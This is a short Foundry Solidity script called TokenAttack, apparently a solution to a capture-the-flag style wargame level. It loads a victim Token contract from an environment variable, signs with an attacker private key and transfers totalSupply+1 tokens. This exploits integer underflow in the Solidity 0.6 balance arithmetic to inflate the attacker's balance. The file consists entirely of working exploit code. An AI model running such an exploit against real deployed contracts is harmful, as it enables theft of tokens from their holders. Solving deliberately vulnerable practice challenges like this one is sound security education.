// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Script} from "forge-std/Script.sol";
import {Token} from "../src/Token.sol";

contract TokenAttack is Script{
  function run() public{
    address tokenAddress = vm.envAddress("VICTIM_CONTRACT_INSTANCE");
    Token token = Token(tokenAddress);

    uint256 attackerPK = vm.envUint("PRIVATE_KEY");

    // Getting the total Supply
    uint256 totalSupply = token.totalSupply();

    vm.startBroadcast(attackerPK);

    token.transfer(address(0), totalSupply+1);

    vm.stopBroadcast();
  }
}